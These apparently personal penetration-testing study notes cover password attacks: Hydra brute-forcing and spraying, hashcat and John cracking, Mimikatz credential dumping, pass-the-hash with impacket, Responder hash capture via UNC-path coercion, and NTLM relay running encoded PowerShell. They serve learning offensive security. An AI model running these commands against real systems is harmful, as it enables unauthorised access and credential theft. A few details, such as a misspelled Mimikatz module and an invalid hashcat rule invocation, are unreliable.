<h3 id="hydra">Hydra</h3>
<ul>
<li>Can be used on a lot of things</li>
<li>SSH:<ul>
<li>`sudo hydra -l {username} -P {password_list} -s {port} ssh://{IP}</li>
<li>Lets say we found a password, and want to spray it everywhere (like rdp)<ul>
<li><code>sudo hydra -L {username_list} -p {password} rdp://{IP}</code></li>
</ul>
</li>
</ul>
</li>
<li>HTTP:<ul>
<li>Provide a username, password list, IP, endpoint to post to, ^PASS^ for the password used, and a string in the HTTP of the failed result</li>
<li><code>sudo hydra -l {username} -P {password_list} {IP} http-post-form &quot;/{endpoint}:{param1}=^PASS^:Login failed. Invalid&quot;</code><ul>
<li>So, for example: <code>sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form &quot;/index.php:user=admin&amp;password=^PASS^:Login failed. Invalid&quot;</code></li>
</ul>
</li>
<li>Could also likely just use ffuf (with a filter on size if app returns 200)<h3 id="passwords">Passwords</h3>
</li>
</ul>
</li>
<li>AES is symmetric, RSA is asymmetric</li>
<li>GPUs crack like a thousand times faster than CPUs<h3 id="password-cracking">Password Cracking</h3>
</li>
<li>Mutating Wordlists:<ul>
<li><a href="https://github.com/frizb/Hashcat-Cheatsheet?tab=readme-ov-file">https://github.com/frizb/Hashcat-Cheatsheet?tab=readme-ov-file</a></li>
<li>Sometimes wordlists might not match the minimum requirements of a password for a location being tested, so the wordlist can drop all of the unneeded passwords</li>
<li><code>hashcat -r &quot;$1 c $!&quot; {password_list}</code> will capitalize the first letter of each password, append &quot;1&quot; to the end of each password, and then append &quot;!&quot; to the end of that password<ul>
<li>Putting these rules into a file with newlines will create a new password for each newline, adding that lines modifications to that password</li>
<li>Hashcat provides some rules in <code>/usr/share/hashcat/rules/</code>, like <code>rockyou-30000</code><ul>
<li>They always seem to use <code>best64.rule</code></li>
</ul>
</li>
</ul>
</li>
<li>These modifications can be stored in files and used when cracking--for example:<ul>
<li><code>hashcat -m 0 {hash} {password_list} -r {modification_file} --force</code></li>
</ul>
</li>
</ul>
</li>
<li>Ensure to find the type of hash before cracking to save time</li>
<li>Extracting hashes:<ul>
<li>Many methods, but here&#39;s a novel one:<ul>
<li><code>Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue</code> will search for kdbx files (KeePass files) containing hashes</li>
<li>keepass2john {keepass_database_file} to extract hash</li>
</ul>
</li>
</ul>
</li>
<li>Determining hash type:<ul>
<li><code>hashcat --help</code> will list a lot of info about types of hashes, so if we know where the hash is from, we can look it up here with <code>hashcat --help | grep -i &quot;{identifier}</code><ul>
<li>This should return the hashcat mode for the hash, which is a number like 13400</li>
</ul>
</li>
</ul>
</li>
<li>Cracking the hash:<ul>
<li><code>hashcat -m {hashcat_mode (e.g. 13400)} {hash} {wordlist} -r {mutation} --force</code><ul>
<li>Increase speed with <code>-O -w 4 --opencl-device-types 1,2</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="ssh-private-key-passphrase">SSH Private Key Passphrase</h3>
<ul>
<li><code>ssh2john {private RSA SSH key file} &gt; ssh.hash</code> will put the hash in a crack-able format</li>
<li><code>hashcat -m 22921 ssh.hash {password_list} -r {mutation} --force</code> will crack the SSH hash<ul>
<li>22921 comes from looking up \$6$ in the <code>hashcat --help</code> response</li>
<li>However, this might result in an error due to this cipher not being supported by hashcat</li>
</ul>
</li>
<li>John the Ripper <ul>
<li>Can handle the error above</li>
<li>Can use mutation rules, placed at the end of /etc/john/john.conf</li>
<li><code>john --wordlist={password_list} --rules=sshRules {hash}</code> to crack</li>
</ul>
</li>
</ul>
<h3 id="ntlm">NTLM</h3>
<ul>
<li>NT LAN Manager or Net-NTLMv2</li>
<li>Windows stores hashed passwords in the Security Account Manager (SAM) database file</li>
<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> can extract password hashes from memory as a basic user<ul>
<li>Prebuilt version <a href="https://github.com/gentilkiwi/mimikatz/releases">here</a></li>
<li>Can dump plaintext passwords straight as an Administrator</li>
<li>Run with <code>.\mimikatz.exe</code></li>
<li><code>privilege::debug</code> gives us the <code>SeDebugPrivilege</code> to run below commands</li>
<li><code>token::elevate</code> to elevate to SYSTEM user</li>
<li><code>lsadump::sam</code> will dump NTLM hashes of local users</li>
<li><code>sukurlsa::logonpasswords</code> will look for clear-text passwords, dump NTLM hashes (including domain users), and dump Kerberos tickets</li>
</ul>
</li>
<li>Crack NTLM<ul>
<li><code>hashcat -m 1000 {hash} {password_list} -r {mutations} --force</code></li>
</ul>
</li>
<li><strong>Passing NTLM</strong><ul>
<li>Don&#39;t necessarily need to crack the NTLM hash to use it<ul>
<li>NTLM hashes aren&#39;t salted between sessions and remain static</li>
</ul>
</li>
<li>Many tools available:<ul>
<li>SMB enumeration: <code>smbclient</code> and <code>crackmapexec</code></li>
<li>Command execution: <code>impacket</code> -&gt; <code>psexec.py\/wmiexec.py</code></li>
<li><code>Mimikatz</code> can also pass-the-hash</li>
</ul>
</li>
<li>Example - accessing SMB share with <code>smbclient</code><ul>
<li><code>smbclient \\\\{IP}\\{SMB_share_endpoint} -U Administrator --pw-nt-hash {hash_from_Mimikatz}</code></li>
</ul>
</li>
<li>Example2 - getting a shell as an Administrator with <code>psexec.py</code><ul>
<li>Searches for a writeable share and uploads an exe to it, registers exe as a Windows service and starts it</li>
<li><code>impacket-psexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}</code> </li>
<li><code>impacket-wmiexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}</code></li>
<li><code>impacket-smbexec -hashes lmhash:nthash {domain}/{user}@{IP}</code></li>
<li><code>impacket-atexec -hashes lmhash:nthash {domain}/{user}@{IP} {command}</code></li>
</ul>
</li>
</ul>
</li>
<li>Cracking Net-NTLMv2<ul>
<li>Useful when we are an unprivileged user</li>
<li>We have the target start authentication against a machine we own, and capture the hash used during the authentication process</li>
<li><em>Responder</em> is a good tool for capturing Net-NTLMv2 hashes<ul>
<li>Sets up an SMB server that handles auth process and prints hashes</li>
<li><code>sudo responder -I {network interface (like tap0)}</code> to run responder on any given network interface</li>
</ul>
</li>
<li>Getting the target server to contact our server is tricky<ul>
<li>With RCE, it&#39;s easy, just run something like <code>dir \\{Our_machine_IP}\share</code> on the machine running the responder server<ul>
<li>Then, crack the hash with hashcat 5600</li>
</ul>
</li>
<li>Without RCE, there are a couple different techniques<ul>
<li>If there&#39;s a file upload on a webserver on the target, we can use a UNC path (<code>\\{our_IP}\share\xyz)</code> and the application may try to reach out for the file<ul>
<li>This might not work if the slashes are the wrong way, so try something like <code>//{IP}/share.php</code> as the filename</li>
</ul>
</li>
<li>I&#39;d assume local file inclusion would have the same result</li>
</ul>
</li>
</ul>
</li>
<li><strong>Relay Attack</strong><ul>
<li>Lets say you&#39;re in a situation where you&#39;re on a local admin account, but it&#39;s an admin on a different machine. Additionally, we can&#39;t crack the hash from the admin. </li>
<li>Instead of printing the hash, forward it along using <em>ntlmrelayx</em></li>
<li><code>sudo impacket-ntlmrelayx --no-http-server -smb2support -t {IP} -c &quot;powershell -enc {base64_command}&quot;</code><ul>
<li>This will set up an SMB relay to the IP with a powershell command to run</li>
<li>Run SMB <code>dir</code> from the machine we own against the <em>ntlmrelayx</em> machine, which will immediately pass the hash received onto the target machine</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
